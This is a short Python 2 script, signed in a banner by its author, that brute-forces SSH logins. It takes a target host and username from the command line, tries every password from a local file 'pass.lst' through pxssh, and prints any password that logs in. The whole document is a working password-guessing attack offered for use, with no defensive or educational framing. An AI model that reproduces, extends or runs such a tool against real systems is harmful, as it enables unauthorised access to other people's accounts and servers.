from pexpect import pxssh
import sys
from termcolor import colored
print colored('###################################################','red')
print colored('###################################################','red')
print colored('#########[+] Coded by : HAMZA ETTALABI [+]#########','green')
print colored('###################################################','red')
print colored('###################################################','red')
print colored('###################################################','red')
hostname = str(sys.argv[1])
username = str(sys.argv[2])
f = open('pass.lst', 'r')
passwd = f.read().splitlines()
for passw in passwd:
	try:
		s = pxssh.pxssh()
		s.login(hostname, username, passw)
		print '[+]username[+] -->'+username, '[+]password[+] -->'+passw+ 'found'
	except pxssh.ExceptionPxssh:
		print 'username : '+username,'password : '+passw+' not found'
